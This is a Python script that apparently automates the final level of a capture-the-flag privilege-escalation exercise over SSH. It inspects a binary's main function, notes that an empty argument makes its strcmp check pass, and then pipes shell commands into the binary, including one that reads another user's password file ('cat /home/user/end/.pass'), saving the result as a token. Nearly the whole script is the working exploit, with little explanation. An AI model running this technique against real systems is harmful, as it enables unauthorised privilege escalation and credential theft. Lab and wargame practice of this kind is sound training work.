import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, get_func_structure, connect_by_previous
from utils.text import print_output, print_title
from utils.base import save_token


client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

exec(client, f'./{binary_name}', title='Simple execute binary')
print_title('Nothing happened')

output = exec(client, f'./{binary_name} test', title='Execute with one arg')
print_output(output, 'Output')
print_title('Just print new line')

get_func_structure(client, 'main', title='Open and read password file (+31, +93) compare buffer and first arg (+230) '
                                         'if equal (+230) call system (+262)')
print_title('Okay, binary compare by strcmp but if we send empty arg, strcmp return 0, so tricky... Try this?')

current_user = exec(client, f'echo "whoami" | ./{binary_name} ""', title='Check user')
print_output(current_user, 'Current user')

token = exec(client, f'echo "cat /home/user/end/.pass" | ./{binary_name} ""', title='Steal final password')

save_token(token, client)
print_title('Oh, stop, no more levels ;(')
